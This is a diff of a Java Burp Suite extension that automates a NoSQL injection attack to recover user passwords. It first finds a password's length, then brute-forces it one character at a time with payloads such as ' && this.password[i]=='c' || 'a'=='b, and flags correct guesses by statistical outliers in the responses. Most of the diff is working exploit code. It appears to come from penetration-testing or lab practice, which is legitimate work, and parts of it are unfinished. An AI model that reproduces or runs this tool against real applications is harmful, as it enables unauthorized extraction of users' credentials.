@@ -181,7 +181,7 @@ public class NNN implements BurpExtension {
         return new ArrayList<>(set);
     }
 
-    static void printSuspiciousResponses(ArrayList<HttpRequestResponse> responseList) {
+    static ArrayList<HttpRequestResponse> printSuspiciousResponses(ArrayList<HttpRequestResponse> responseList) {
         // Calculate the maean
         double mean = calculateMean(responseList);
         // Calculate the standard deviation
@@ -206,6 +206,7 @@ public class NNN implements BurpExtension {
         for (HttpRequestResponse obj : outliers) {
             infoPane.setText(infoPane.getText() + "Status Code: " + obj.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", obj.response().toString().length()) + "       Payload: " + (obj.request().query().isBlank() ? api.utilities().urlUtils().decode(obj.request().body()) : api.utilities().urlUtils().decode(obj.request().query())) + "\n");
         }
+        return outliers;
     }
 
 
@@ -416,18 +417,18 @@ public class NNN implements BurpExtension {
         }).start();
     }
 
-    static void dataExtractionTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
+    static void dataExtraction(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
         new Thread(() -> {
             try {
-                infoPane.setText(infoPane.getText() + "[i] Data Extraction Test\n");
+                infoPane.setText(infoPane.getText() + "[i] Extraction of data\n");
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
 
-                // 1. Identify password length
+                // Identify password length
                 int passwordLength = identifyPasswordLength(requestResponse, startIndex, endIndex, httpService);
 
-                // 2. Enumerate the password
+                // Enumerate the password
                 if (passwordLength > 0) {
                     enumeratePassword(requestResponse, startIndex, endIndex, httpService, passwordLength);
                 }
@@ -441,18 +442,19 @@ public class NNN implements BurpExtension {
     private static int identifyPasswordLength(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService) {
         int length = 0;
         try {
-            HttpRequest request2send;
+            HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
             HttpRequestResponse response2receive;
-            for (int i = 1; i < 100; i++) {  // assuming the max length of password is less than 100
-                //String payload = "administrator' && this.password.length=='" + i;
-                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + "administrator'" + api.utilities().urlUtils().encode("&&") + "this.password.length=='" + i + requestResponse.request().toString().substring(endIndex));
-                response2receive = api.http().sendRequest(request2send);
-
-                if (!response2receive.response().toString().contains("Could not find user")) {
-                    length = i;
-                    infoPane.setText(infoPane.getText() + "[i] Password length identified: " + length + "\n");
-                    break;
+            String fieldValue =  requestResponse.request().toString().substring(startIndex,endIndex);
+            ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
+            if (request2send.method().equals("GET")) {
+                for (int i = 1; i < 50; i++) {  // assuming the max length of password is less than 100
+                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "' && this.password.length>" + i + " || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
+                    response2receive = api.http().sendRequest(request2send);
+                    responseList.add(response2receive);
                 }
+                length = printSuspiciousResponses(responseList).size() + 1;
+            } else {
+
             }
         } catch (Exception e) {
             api.logging().logToError("[!] Error identifying password length");
@@ -463,24 +465,32 @@ public class NNN implements BurpExtension {
 
     private static void enumeratePassword(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService, int passwordLength) {
         try {
-            HttpRequest request2send;
+            HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
             HttpRequestResponse response2receive;
             char[] password = new char[passwordLength];
+            String fieldValue =  requestResponse.request().toString().substring(startIndex,endIndex);
+            ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
+            if (request2send.method().equals("GET")) {
+                infoPane.setText(infoPane.getText() + "[i] Identified characters:\n");
+                for (int i = 0; i < passwordLength; i++) {
+                    responseList = new ArrayList<>(); // Collect responses to later analyze them
+                    for (char c = 'a'; c <= 'z'; c++) {  // assuming the password is lowercase letters
+                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "' && this.password[" + i + "]=='" + c + "' || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
+                        response2receive = api.http().sendRequest(request2send);
+                        responseList.add(response2receive);
 
-            for (int i = 0; i < passwordLength; i++) {
-                for (char c = 'a'; c <= 'z'; c++) {  // assuming the password is lowercase letters
-                    //String payload = "administrator' && this.password[" + i + "]=='" + c + "'";
-                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + "administrator'" + api.utilities().urlUtils().encode("&&") + "this.password[" + i + "]=='" + c + requestResponse.request().toString().substring(endIndex));
-                    response2receive = api.http().sendRequest(request2send);
-
-                    if (response2receive.response().toString().contains("administrator")) {
-                        password[i] = c;
-                        infoPane.setText(infoPane.getText() + "[i] Identified character at position " + i + ": " + c + "\n");
-                        break;
+                    }
+                    try {
+                        String query = printSuspiciousResponses(responseList).get(0).request().query();
+//                        infoPane.setText(infoPane.getText() + "[i] Identified character at position " + i + ": "+ api.utilities().urlUtils().decode(query) + "\n");
+                    } catch (Exception e) {
+                        api.logging().logToError("[!] No correct character found for position: " + i);
+                        api.logging().logToError(e);
                     }
                 }
+            } else {
+
             }
-            infoPane.setText(infoPane.getText() + "[i] Password identified: " + new String(password) + "\n");
         } catch (Exception e) {
             api.logging().logToError("[!] Error enumerating password");
             api.logging().logToError(e);
